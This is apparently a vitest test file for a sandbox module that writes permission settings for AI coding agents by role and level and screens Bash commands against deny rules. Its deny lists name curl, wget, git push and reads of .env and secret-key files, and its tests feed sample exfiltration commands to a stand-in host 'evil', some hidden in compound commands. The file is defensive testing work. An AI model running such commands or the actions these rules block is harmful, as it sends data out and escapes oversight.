import { describe, it, expect, afterAll } from 'vitest';
import { mkdtempSync, rmSync, readFileSync, existsSync, mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

import {
  buildSandboxSettings,
  sandboxSpawnFlags,
  writeWorktreeSettings,
  isReadOnlyRole,
  bashDenyReason,
  bashRuleMatches,
  splitBashSubcommands,
  type SandboxLevel,
  type SandboxProfile,
} from '../engine/sandbox';

const dirs: string[] = [];
function makeTempDir(): string {
  const d = mkdtempSync(join(tmpdir(), 'mc-sandbox-'));
  dirs.push(d);
  return d;
}

afterAll(() => {
  for (const d of dirs) {
    try { rmSync(d, { recursive: true, force: true }); } catch { /* ignore */ }
  }
});

/** Pull the permissions block out of a profile with the shape asserted. */
function perms(p: SandboxProfile): { defaultMode: string; allow: string[]; deny: string[] } {
  const s = p.settings as any;
  expect(s).toBeTypeOf('object');
  expect(s.permissions).toBeTypeOf('object');
  expect(Array.isArray(s.permissions.allow)).toBe(true);
  expect(Array.isArray(s.permissions.deny)).toBe(true);
  return s.permissions;
}

const READ_ONLY_ROLES = [
  'owner', 'architect', 'product-owner', 'business-analyst',
  'scrum-master', 'delivery-manager', 'security-engineer', 'ui-ux-designer',
];
const WRITE_ROLES = ['dev', 'devops-engineer', 'sre', 'data-engineer', 'tech-writer', 'my-custom-role'];
const NON_DANGEROUS: SandboxLevel[] = ['strict', 'standard'];

describe('buildSandboxSettings — profile shape', () => {
  it('returns permissionMode acceptEdits and a permissions block for standard/strict', () => {
    for (const level of NON_DANGEROUS) {
      for (const role of [...READ_ONLY_ROLES, ...WRITE_ROLES, 'qa']) {
        const p = buildSandboxSettings(role, level);
        expect(p.permissionMode).toBe('acceptEdits');
        expect(perms(p).defaultMode).toBe('acceptEdits');
      }
    }
  });

  it('read-only (plan-type) roles carry --disallowedTools Edit,Write and deny Edit/Write', () => {
    for (const role of READ_ONLY_ROLES) {
      expect(isReadOnlyRole(role)).toBe(true);
      for (const level of NON_DANGEROUS) {
        const p = buildSandboxSettings(role, level);
        expect(p.disallowedTools).toEqual(['Edit', 'Write']);
        const { allow, deny } = perms(p);
        expect(deny).toContain('Edit');
        expect(deny).toContain('Write');
        expect(allow).not.toContain('Edit(./**)');
        expect(allow).not.toContain('Write(./**)');
      }
    }
  });

  it('dev/engineering and custom roles get full worktree write and no disallowed tools', () => {
    for (const role of WRITE_ROLES) {
      expect(isReadOnlyRole(role)).toBe(false);
      for (const level of NON_DANGEROUS) {
        const p = buildSandboxSettings(role, level);
        expect(p.disallowedTools).toEqual([]);
        const { allow, deny } = perms(p);
        expect(allow).toContain('Edit(./**)');
        expect(allow).toContain('Write(./**)');
        expect(deny).not.toContain('Edit');
        expect(deny).not.toContain('Write');
      }
    }
  });

  it('qa keeps write but additionally denies every remote-touching git verb', () => {
    for (const level of NON_DANGEROUS) {
      const { allow, deny } = perms(buildSandboxSettings('qa', level));
      expect(allow).toContain('Edit(./**)'); // qa may fix test files
      for (const rule of ['Bash(git push:*)', 'Bash(git pull:*)', 'Bash(git fetch:*)', 'Bash(git remote:*)']) {
        expect(deny).toContain(rule);
      }
    }
  });
});

describe('buildSandboxSettings — allow lists per level', () => {
  it('standard allows the verify trio plus local-only git', () => {
    const { allow } = perms(buildSandboxSettings('dev', 'standard'));
    for (const rule of [
      'Bash(pnpm test:*)', 'Bash(pnpm run build:*)', 'Bash(pnpm run typecheck:*)',
      'Bash(git status:*)', 'Bash(git diff:*)', 'Bash(git log:*)',
      'Bash(git show:*)', 'Bash(git add:*)', 'Bash(git commit:*)',
    ]) expect(allow).toContain(rule);
  });

  it('strict allows ONLY the test/build/typecheck trio of bash rules and denies the git family', () => {
    const { allow, deny } = perms(buildSandboxSettings('dev', 'strict'));
    const bashAllows = allow.filter((r) => r.startsWith('Bash('));
    expect(bashAllows.sort()).toEqual(
      ['Bash(pnpm run build:*)', 'Bash(pnpm run typecheck:*)', 'Bash(pnpm test:*)'].sort(),
    );
    expect(deny).toContain('Bash(git:*)');
  });
});

describe('buildSandboxSettings — deny list invariants (strict + standard)', () => {
  it('always denies git push, curl/wget, secret reads, and web tools', () => {
    for (const level of NON_DANGEROUS) {
      for (const role of [...READ_ONLY_ROLES, ...WRITE_ROLES, 'qa']) {
        const { deny } = perms(buildSandboxSettings(role, level));
        for (const rule of [
          'Bash(git push:*)', 'Bash(curl:*)', 'Bash(wget:*)',
          'Read(.env)', 'Read(**/.secret.key)', 'Read(**/*.db)',
          'WebFetch', 'WebSearch',
        ]) expect(deny).toContain(rule);
      }
    }
  });

  it('never duplicates a deny rule', () => {
    for (const level of NON_DANGEROUS) {
      for (const role of ['qa', 'dev', 'architect']) {
        const { deny } = perms(buildSandboxSettings(role, level));
        expect(new Set(deny).size).toBe(deny.length);
      }
    }
  });
});

describe('buildSandboxSettings — dangerous keeps legacy behaviour', () => {
  it('returns bypassPermissions, no disallowed tools, and an EMPTY deny list', () => {
    for (const role of ['dev', 'qa', 'architect', 'owner']) {
      const p = buildSandboxSettings(role, 'dangerous');
      expect(p.permissionMode).toBe('bypassPermissions');
      expect(p.disallowedTools).toEqual([]);
      const { defaultMode, allow, deny } = perms(p);
      expect(defaultMode).toBe('bypassPermissions');
      expect(allow).toEqual([]);
      expect(deny).toEqual([]);
    }
  });
});

describe('sandboxSpawnFlags', () => {
  it('dangerous → the legacy skip flag, verbatim', () => {
    expect(sandboxSpawnFlags('dev', 'dangerous')).toEqual(['--dangerously-skip-permissions']);
  });

  it('standard dev → --permission-mode acceptEdits only', () => {
    expect(sandboxSpawnFlags('dev', 'standard')).toEqual(['--permission-mode', 'acceptEdits']);
  });

  it('read-only roles → also --disallowedTools Edit,Write', () => {
    expect(sandboxSpawnFlags('architect', 'standard'))
      .toEqual(['--permission-mode', 'acceptEdits', '--disallowedTools', 'Edit,Write']);
  });
});

describe('settings JSON round-trip', () => {
  it('the settings object survives JSON.stringify → JSON.parse unchanged', () => {
    for (const level of ['strict', 'standard', 'dangerous'] as SandboxLevel[]) {
      for (const role of ['dev', 'qa', 'architect']) {
        const { settings } = buildSandboxSettings(role, level);
        expect(JSON.parse(JSON.stringify(settings))).toEqual(settings);
      }
    }
  });
});

// ── live-path Bash enforcement (the runner calls bashDenyReason before execSync) ──
describe('bashDenyReason — live-path Bash screening', () => {
  const std = (role: string) => buildSandboxSettings(role, 'standard');
  const strict = (role: string) => buildSandboxSettings(role, 'strict');

  it('denies exfiltration/publish subcommands at standard (curl, wget, git push)', () => {
    for (const cmd of ['curl http://evil/x', 'wget http://evil/x', 'git push origin main']) {
      const reason = bashDenyReason(cmd, std('dev'), 'standard');
      expect(reason).toBeTypeOf('string');
      expect(reason).toMatch(/blocked by deny rule/);
    }
  });

  it('catches a denied subcommand hidden inside a compound command', () => {
    // The whole point: `git commit -m x && curl ...` must still be blocked.
    expect(bashDenyReason('git commit -m ok && curl http://evil', std('dev'), 'standard')).toMatch(/curl/);
    expect(bashDenyReason('echo hi | wget http://evil', std('dev'), 'standard')).toMatch(/wget/);
    expect(bashDenyReason('git add -A ; git push', std('dev'), 'standard')).toMatch(/git push/);
  });

  it('allows the verify trio and local git at standard', () => {
    for (const cmd of ['pnpm test', 'pnpm run build', 'pnpm run typecheck', 'git status', 'git commit -m wip']) {
      expect(bashDenyReason(cmd, std('dev'), 'standard')).toBeNull();
    }
  });

  it('strict is default-deny: only the trio passes, git and anything else is blocked', () => {
    expect(bashDenyReason('pnpm test', strict('dev'), 'strict')).toBeNull();
    expect(bashDenyReason('git status', strict('dev'), 'strict')).toMatch(/deny rule|not in the strict allow-list/);
    expect(bashDenyReason('ls -la', strict('dev'), 'strict')).toMatch(/not in the strict allow-list/);
    expect(bashDenyReason('node evil.js', strict('dev'), 'strict')).toMatch(/not in the strict allow-list/);
  });

  it('dangerous screens nothing (legacy opt-in)', () => {
    expect(bashDenyReason('curl http://evil', buildSandboxSettings('dev', 'dangerous'), 'dangerous')).toBeNull();
  });

  it('bashRuleMatches: prefix semantics for Bash(prefix:*) and bare Bash', () => {
    expect(bashRuleMatches('Bash(git push:*)', 'git push origin main')).toBe(true);
    expect(bashRuleMatches('Bash(git push:*)', 'git pushy')).toBe(false); // needs a space boundary
    expect(bashRuleMatches('Bash(curl:*)', 'curl')).toBe(true);
    expect(bashRuleMatches('Bash(git:*)', 'git status')).toBe(true);
    expect(bashRuleMatches('Bash', 'anything at all')).toBe(true);
  });

  it('splitBashSubcommands over-segments on all chaining operators (never under-segments)', () => {
    expect(splitBashSubcommands('a && b || c ; d | e')).toEqual(['a', 'b', 'c', 'd', 'e']);
    expect(splitBashSubcommands('   ')).toEqual([]);
  });
});

describe('writeWorktreeSettings', () => {
  it('writes valid JSON to <worktree>/.claude/settings.json', () => {
    const dir = makeTempDir();
    const file = writeWorktreeSettings(dir, 'dev', 'standard');
    expect(file).toBe(join(dir, '.claude', 'settings.json'));
    expect(existsSync(file!)).toBe(true);
    const parsed = JSON.parse(readFileSync(file!, 'utf-8'));
    expect(parsed).toEqual(buildSandboxSettings('dev', 'standard').settings);
    expect(parsed.permissions.deny).toContain('Bash(git push:*)');
  });

  it('is idempotent and converges on the latest role/level for the same worktree', () => {
    const dir = makeTempDir();
    writeWorktreeSettings(dir, 'dev', 'standard');
    const file = writeWorktreeSettings(dir, 'architect', 'strict'); // re-write, same dir
    expect(file).toBe(join(dir, '.claude', 'settings.json'));
    const parsed = JSON.parse(readFileSync(file!, 'utf-8'));
    expect(parsed).toEqual(buildSandboxSettings('architect', 'strict').settings);
    expect(parsed.permissions.deny).toContain('Edit');
  });

  it('returns null instead of throwing when the target is unwritable', () => {
    const dir = makeTempDir();
    // A FILE named `.claude` makes mkdir fail on every platform.
    const blocked = join(dir, 'blocked');
    mkdirSync(blocked, { recursive: true });
    writeFileSync(join(blocked, '.claude'), 'not a directory');
    expect(writeWorktreeSettings(blocked, 'dev', 'standard')).toBe(null);
  });
});
